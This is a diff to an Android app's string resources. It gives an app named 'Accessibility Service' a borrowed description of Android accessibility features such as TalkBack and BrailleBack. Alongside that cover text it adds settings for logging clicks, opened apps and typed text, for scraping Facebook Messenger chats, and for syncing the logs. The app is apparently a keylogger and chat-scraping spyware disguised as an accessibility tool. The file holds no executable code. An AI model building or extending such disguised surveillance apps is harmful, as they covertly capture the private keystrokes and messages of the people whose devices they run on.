@@ -1,4 +1,73 @@
 <resources>
     <string name="app_name">Accessibility Service</string>
-    <string name="description">This service is used for the text input for devices.</string>
+    <string name="description">Android accessibility features and apps enable you to customize your Android device to suit your needs. A brief summary of features is below, along with links to more information.
+
+Services and tools for using your Android device
+Screen reader (TalkBack): TalkBack is a screen reader that\'s included on your Android device. TalkBack uses spoken feedback to describe your actions and to tell you about alerts and notifications. Learn more about TalkBack.
+Switch access: Switch access enables you to control your device with one or more switches. For users with limited mobility, switch access provides an alternative to using the touch screen. Learn more about switch access. (Android 5.0+)
+Braille support (BrailleBack): BrailleBack is an add-on accessibility service that lets you connect a supported refreshable braille display to your Android device via Bluetooth. BrailleBack works with TalkBack for a combined speech and braille experience, allowing you to input text and interact with your Android device. Learn more about BrailleBack.</string>
+    <string name="title_activity_settings">AccessibilityService Settings</string>
+
+    <!-- Strings related to Settings -->
+    <string-array name="empty_array" />
+
+    <!-- Example General settings -->
+    <string name="pref_header_general">General</string>
+
+    <string name="pref_title_display_name">Display Name</string>
+    <string name="pref_display_name_summary">Set the username visible in the logs.</string>
+    <string name="pref_key_display_name">KEY_DISPLAY_NAME</string>
+    <string name="pref_default_display_name">You</string>
+
+    <!-- Event Logging Settings -->
+    <string name="pref_events_title">Event Tracking</string>
+
+    <string name="pref_title_event_general">General Events</string>
+    <string name="pref_event_general_summary">Logs general events. Such as clicking on Buttons. Opening applications, …</string>
+    <string name="pref_key_event_general">KEY_EVENT_GENERAL</string>
+
+    <string name="pref_title_event_text">Text Events</string>
+    <string name="pref_event_text_summary">Logs text typed in EditText widgets.</string>
+    <string name="pref_key_event_text">KEY_EVENT_TEXT</string>
+
+    <string name="pref_events_experimental_title">Experimental Event Tracking</string>
+
+    <string name="pref_title_chat_event">Chat Events</string>
+    <string name="pref_chat_event_summary">Scrapes chat messages from popular chat apps. Defined below</string>
+    <string name="pref_key_chat_event">KEY_CHAT_EVENT</string>
+
+    <!-- Chat Applications -->
+    <string name="pref_events_experimental_apps_title">Chat Applications</string>
+    <string name="pref_events_apps_title">Available Apps</string>
+    <string name="pref_key_apps">KEY_CHAT_APPS</string>
+    <string name="pref_events_app_summary">Select the social apps you want the service to track the chat messages from.</string>
+    <string-array name="pref_events_apps_titles">
+        <item>Messenger</item>
+    </string-array>
+    <string-array name="pref_events_apps_values">
+        <item>com.facebook.orca</item>
+    </string-array>
+
+    <!-- Example settings for Data & Sync -->
+    <string name="pref_header_data_sync">Data &amp; Sync</string>
+
+    <string name="pref_title_sync_frequency">Sync Frequency</string>
+    <string-array name="pref_sync_frequency_titles">
+        <item>15 minutes</item>
+        <item>30 minutes</item>
+        <item>1 hour</item>
+        <item>3 hours</item>
+        <item>6 hours</item>
+        <item>Every day</item>
+        <item>Never</item>
+    </string-array>
+    <string-array name="pref_sync_frequency_values">
+        <item>15</item>
+        <item>30</item>
+        <item>60</item>
+        <item>180</item>
+        <item>360</item>
+        <item>1440</item>
+        <item>-1</item>
+    </string-array>
 </resources>
